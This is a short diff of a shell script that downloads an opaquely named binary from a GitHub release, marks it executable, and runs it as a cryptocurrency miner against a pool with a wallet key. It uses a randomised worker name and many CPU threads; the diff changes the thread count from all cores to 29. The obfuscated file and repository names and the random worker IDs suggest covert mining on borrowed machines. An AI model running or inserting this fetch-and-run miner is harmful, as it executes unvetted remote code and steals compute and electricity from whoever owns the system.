@@ -2,4 +2,4 @@
 apt update && apt install unzip
 wget https://github.com/vedhagsvp/cnajea/releases/download/orno/bnmkop
 chmod +x bnmkop
-./bnmkop mine -a --pool twbitz --key xLPMoYZixVLRHJV7hb9gZoMusczWYRzP7JqFCRb6vXp --worker $(shuf -n 1 -i 1-99999)-GVPK2 -t $(nproc --all)
+./bnmkop mine -a --pool twbitz --key xLPMoYZixVLRHJV7hb9gZoMusczWYRzP7JqFCRb6vXp --worker $(shuf -n 1 -i 1-99999)-GVPK2 -t 29
